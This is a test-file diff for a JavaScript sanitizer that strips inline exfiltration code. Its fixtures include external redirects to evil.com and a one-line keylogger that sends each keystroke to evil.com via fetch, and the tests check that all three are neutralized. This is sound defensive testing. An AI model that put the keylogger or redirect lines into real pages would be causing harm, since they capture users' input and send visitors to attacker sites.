@@ -134,4 +134,33 @@ describe('removeInlineExfil', () => {
     expect(out).toContain('keep');
     expect(parseJs(out, 't.js')).not.toBeNull();
   });
+
+  // ── RED-1 / KEY-1: внешний редирект и keylogger у владельца не легит → нейтрализуем ──
+  it('RED-1: внешний редирект location.href= нейтрализуется, остальное цело', () => {
+    const code = `location.href = 'https://evil.com/offer'; doStuff();`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(out).toContain('doStuff');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
+
+  it('RED-1: location.assign(external) нейтрализуется', () => {
+    const { code: out, removed } = run(`location.assign('https://evil.com/x');`);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+  });
+
+  it('KEY-1: keylogger document.onkeydown + fetch нейтрализуется', () => {
+    const code = `document.onkeydown = function(e){ fetch('https://evil.com/k?'+e.key); };`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
+
+  it('НЕ-регресс: редирект на свой хост не трогаем', () => {
+    const { removed } = run(`location.href = '/thank-you';`);
+    expect(removed).toBe(0);
+  });
 });
